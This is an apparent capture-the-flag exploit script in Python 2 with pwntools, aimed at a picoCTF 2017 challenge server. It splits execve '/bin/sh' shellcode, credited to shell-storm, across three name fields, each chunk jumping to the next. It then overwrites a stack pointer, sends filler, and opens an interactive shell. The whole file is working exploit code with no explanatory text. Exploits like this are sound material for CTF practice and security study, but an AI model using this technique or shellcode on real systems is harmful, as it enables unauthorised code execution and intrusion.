#!/usr/bin/env python2
from pwn import *
r = remote("shell2017.picoctf.com",40492)
for i in range(11):
	r.recvuntil("%d:"%i)
	r.send("c\n")
#slightly modified shellcode from http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode1 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\xeb\x0e"
shellcode2 = "\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xeb\x0d"
shellcode3 = "\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
r.recvuntil("Enter a name for this centaur:")
r.send("%s\n"%shellcode1)
r.recvuntil("Enter a name for this centaur:")
r.send("%s\n"%shellcode2)
r.recvuntil("Enter a name for this centaur:")
r.send("%s\n"%shellcode3)
for i in range(3,10):
	r.recvuntil("Enter a name for this centaur:")
	r.send("ABCDEFGH\n")
r.recvuntil("Enter a name for this centaur:")
r.send("AB\x9a\xdb\xff\xff\n")
r.send("a\n"*40)
r.interactive()